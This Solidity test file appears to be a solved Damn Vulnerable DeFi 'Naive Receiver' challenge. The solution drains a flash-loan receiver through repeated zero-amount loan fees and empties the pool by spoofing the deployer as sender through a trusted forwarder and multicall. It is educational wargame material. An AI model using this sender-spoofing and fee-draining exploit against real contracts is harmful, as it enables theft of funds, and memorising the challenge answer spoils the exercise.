// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(bytes4(hex"48f5c3ed"));
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        // Array to hold all encoded calldata for multicall (10 flashloans + 1 withdrawal)
        bytes[] memory callDatas = new bytes[](11);

        // Encode 10 flashloan calls with 0 amount to drain receiver via fees each iteration
        for(uint i=0; i<10; i++){
            callDatas[i] = abi.encodeCall(
                NaiveReceiverPool.flashLoan,
                (receiver, address(weth), 0, "0x")  // 0 loan amount, but fee still charged
            );  
        }

        // Encode withdrawal call to drain both pool and receiver funds to recovery address
        // Appends deployer address as extra bytes (used as msg.sender override via forwarder)
        callDatas[10] = abi.encodePacked(
            abi.encodeCall(
                NaiveReceiverPool.withdraw,
                (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))  // withdraw full balance
            ),
            bytes32(uint256(uint160(deployer)))  // append deployer as trusted sender context
        ); 

        // Wrap all calls into a single multicall to execute atomically in one transaction
        bytes memory multicallData = abi.encodeCall(pool.multicall, callDatas);

        // Build a meta-transaction request for the BasicForwarder (EIP-712 style)
        BasicForwarder.Request memory request = BasicForwarder.Request(
            player,          // from: the signer of this meta-tx
            address(pool),   // target contract to forward calls to
            0,               // value (no ETH sent)
            gasleft(),       // gas limit for execution
            forwarder.nonces(player),  // replay-protection nonce
            multicallData,   // the actual calldata to forward
            1 days           // deadline: request valid for 1 day
        ); 

        // Compute EIP-712 hash: domain separator + structured data hash, with prefix
        bytes32 requestHash = keccak256(
            abi.encodePacked(
                "\x19\x01",                        // EIP-191 typed data prefix
                forwarder.domainSeparator(),        // contract's EIP-712 domain
                forwarder.getDataHash(request)      // hash of the request struct
            )
        );

        // Sign the request hash with the player's private key (produces v, r, s components)
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);

        // Pack signature components in r, s, v order (as expected by the forwarder)
        bytes memory signatures = abi.encodePacked(r, s, v);

        // Submit the signed meta-transaction through the forwarder to execute all calls
        forwarder.execute(request, signatures);  
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}
